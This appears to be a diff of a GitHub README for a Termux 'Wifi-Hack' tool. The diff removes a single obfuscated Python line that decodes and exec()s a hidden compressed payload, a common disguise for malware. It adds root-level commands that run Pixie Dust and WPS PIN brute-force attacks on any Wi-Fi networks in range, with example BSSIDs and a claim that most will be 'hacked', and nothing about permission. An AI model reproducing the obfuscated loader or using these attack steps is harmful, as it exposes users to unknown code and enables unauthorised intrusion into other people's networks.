@@ -1,3 +1,50 @@
+## Wifi-Hack 🗿
+### Hack WIfi Using Termux! (Need Rooted Device )🧑‍💻
 
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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')) 
+[![Screenshot-20240524-183227-Termux.png](https://i.postimg.cc/qMjPGGTw/Screenshot-20240524-183227-Termux.png)](https://postimg.cc/vcx2YfDx) 
+
+### How to install :
+
+```bash
+pkg update && pkg upgrade
+```
+```
+pkg install git python
+```
+```
+apt update && apt upgrade
+```
+```
+pkg install -y root-repo && pkg install -y git tsu python wpa-supplicant pixiewps iw && termux-setup-storage
+```
+```
+git clone https://github.com/tanvirhasan999/Wifi-Hack
+```
+```
+cd Wifi-Hack
+```
+```
+chmod +x fück-wifi.py
+```
+### Note📝 : Now turn off Wifi 
+```
+sudo python fück-wifi.py -i wlan0 -K
+```
+## Note📝: It will show all Wifi within your range. Among them, 99% of Green's will be hacked. And the White ones may also be tried. And the Red ones will not be hacked.
+
+## Enter this command to open Tool next time. 
+```bash
+sudo python Wifi-Hack/fück-wifi.py -i wlan0 -K
+```
+
+#### Example : `sudo python Wifi-Hack/fück-wifi.py -i wlan0 -K`
+
+#### Note 📝: 
+**First turn off your Wifi.**
+- Show avaliable networks and start Pixie Dust attack on a specified network.
+- `sudo python Wifi-Hack/fück-wifi.py -i wlan0 -K`
+- Start Pixie Dust attack on a specified BSSID:
+`sudo python Wifi-Hack/fück-wifi.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
+- Launch online WPS bruteforce with the specified first half of the PIN:
+- `sudo python Wifi-Hack/fück-wifi.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`
+## Thanks For Using My Tool ❤️
